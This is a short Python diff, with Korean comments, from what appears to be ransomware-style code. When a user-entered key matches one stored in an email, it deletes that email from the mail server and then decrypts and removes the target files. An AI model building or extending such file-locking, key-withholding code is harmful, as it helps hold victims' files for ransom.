@@ -412,6 +412,10 @@ class RealMain:
 
                 #만약 key(메일에 들어있던 키) 와 gui_input(입력받은 값) 이 같다면
                 if key.strip()==gui_input.strip():
+                    # 해당 메일 삭제
+                    server.dele(i+1)
+                    server.quit()
+
                     ##! 복호화 및 타겟파일 삭제
                     dec_targetlist = self.decListFiles(os.getcwd())
                     for dec_target in dec_targetlist:  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
